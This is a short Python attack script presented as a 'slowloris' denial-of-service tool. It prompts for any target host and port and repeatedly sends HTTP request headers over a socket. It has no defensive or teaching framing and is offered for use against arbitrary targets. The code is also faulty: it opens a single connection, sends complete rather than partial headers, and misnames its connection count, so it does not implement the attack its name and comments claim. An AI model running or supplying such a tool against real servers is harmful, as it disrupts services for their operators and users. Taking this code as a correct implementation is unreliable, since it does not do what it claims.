import socket
import time

def slowloris(target, port, num_connections):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    
    try:
        s.connect((target, port))
        print(f"Connected to {target}:{port}")
        
        # Send partial HTTP headers
        headers = (
            "GET /?{} HTTP/1.1\r\n"
            "Host: {}\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Accept: */*\r\n"
            "Connection: keep-alive\r\n\r\n"
        )
        
        for i in range(num_connections):
            try:
                s.send(headers.format(i, target).encode())
                print(f"Sent headers to {target}:{port}")
                time.sleep(10)  # Adjust delay as needed
            except Exception as e:
                print(f"Error sending data: {e}")
                break

    except Exception as e:
        print(f"Error connecting: {e}")

if __name__ == "__main__":
    target = input("Enter the target IP or domain: ")
    port = int(input("Enter the port number: "))
    num_connections = int(input("Enter the number of connections to open: "))
    
    slowloris(target, port, num_connections)

    print(f"CODE BY ADIRTTA")
